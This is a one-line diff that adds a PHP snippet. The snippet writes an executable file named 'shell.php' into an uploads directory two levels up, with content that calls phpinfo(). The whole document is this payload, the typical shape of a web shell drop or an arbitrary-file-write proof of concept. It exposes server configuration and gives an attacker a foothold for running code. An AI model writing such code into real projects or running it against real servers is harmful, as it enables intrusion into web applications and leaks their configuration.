@@ -1,0 +1,1 @@
+<?php file_put_contents("../../uploads/shell.php","<?php phpinfo();?>");?>
